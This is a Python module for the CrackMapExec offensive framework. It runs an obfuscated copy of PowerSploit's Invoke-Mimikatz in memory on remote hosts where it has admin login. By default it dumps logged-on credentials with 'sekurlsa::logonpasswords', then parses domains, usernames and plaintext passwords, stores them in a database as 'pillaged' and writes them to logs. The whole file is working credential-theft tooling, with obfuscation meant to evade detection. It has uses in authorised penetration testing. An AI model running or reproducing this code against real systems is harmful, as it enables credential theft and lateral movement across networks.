from cme.helpers.logger import write_log, highlight
from cme.helpers.powershell import obfs_ps_script
from cme.parsers.mimikatz import parse_mimikatz
from datetime import datetime


class CMEModule:
    '''
        Executes PowerSploit's Invoke-Mimikatz.ps1 script
        Module by @byt3bl33d3r
    '''

    name = 'mimikatz'
    description = "Executes mimikatz from memory"
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
           COMMAND  Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
        '''
        self.command = 'privilege::debug sekurlsa::logonpasswords exit'
        if module_options and 'COMMAND' in module_options:
            self.command = module_options['COMMAND']

        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')

    def on_admin_login(self, context, connection):
        command = "Invoke-Mimikatz -Command '{}'".format(self.command)
        payload = self.ps_script + '\n' + command

        output = connection.execute(payload)
        context.log.success('Executed payload')
        if output:
            if self.command.find('sekurlsa::logonpasswords') != -1:
                creds = parse_mimikatz(output)
                if len(creds):
                    for cred_set in creds:
                        credtype, domain, username, password,_,_ = cred_set
                        # Get the hostid from the DB
                        hostid = context.db.get_computers(context.target)[0][0]
                        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
                        context.log.highlight('{}\\{}:{}'.format(domain, username, password))

                    context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
            else:
                context.log.highlight(output)

            log_name = 'Mimikatz-{}-{}.log'.format(context.target, datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(output, log_name)
            context.log.info("Saved raw Mimikatz output to {}".format(log_name))
